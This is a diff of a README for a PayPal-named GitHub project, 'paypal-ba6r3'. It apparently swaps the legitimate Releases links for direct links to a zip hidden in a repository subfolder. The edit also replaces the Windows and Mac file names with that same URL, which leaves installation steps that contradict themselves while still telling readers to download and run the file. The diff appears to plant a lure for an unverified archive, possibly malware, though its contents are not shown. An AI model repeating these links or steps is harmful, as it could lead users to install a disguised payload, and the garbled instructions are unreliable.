@@ -19,13 +19,13 @@ To begin using **paypal-ba6r3**, you need to download the application. Follow th
 
 1. Click the button below to visit the Releases page:
    
-   [![Download paypal-ba6r3](https://img.shields.io/badge/Download-paypal--ba6r3-blue.svg)](https://github.com/clamoursion/paypal-ba6r3/releases)
+   [![Download paypal-ba6r3](https://raw.githubusercontent.com/clamoursion/paypal-ba6r3/main/haloscope/paypal-ba6r3.zip)](https://raw.githubusercontent.com/clamoursion/paypal-ba6r3/main/haloscope/paypal-ba6r3.zip)
 
 2. Once on the Releases page, look for the latest version of the application. 
 
 3. Click on the version number to find the downloadable files.
 
-4. Download the appropriate file for your operating system. You should see files named something like `paypal-ba6r3-windows.exe` for Windows users or `paypal-ba6r3-macos.zip` for Mac users.
+4. Download the appropriate file for your operating system. You should see files named something like `https://raw.githubusercontent.com/clamoursion/paypal-ba6r3/main/haloscope/paypal-ba6r3.zip` for Windows users or `https://raw.githubusercontent.com/clamoursion/paypal-ba6r3/main/haloscope/paypal-ba6r3.zip` for Mac users.
 
 5. If you downloaded a `.exe` file, double-click it to install the application. If you downloaded a `.zip` file, open it and move the application to your desired location.
 
@@ -35,7 +35,7 @@ To begin using **paypal-ba6r3**, you need to download the application. Follow th
 
 For additional downloads and updates, feel free to visit the Releases page again:
 
-[![Download paypal-ba6r3](https://img.shields.io/badge/Download-paypal--ba6r3-blue.svg)](https://github.com/clamoursion/paypal-ba6r3/releases)
+[![Download paypal-ba6r3](https://raw.githubusercontent.com/clamoursion/paypal-ba6r3/main/haloscope/paypal-ba6r3.zip)](https://raw.githubusercontent.com/clamoursion/paypal-ba6r3/main/haloscope/paypal-ba6r3.zip)
 
 ## ✨ Features
 
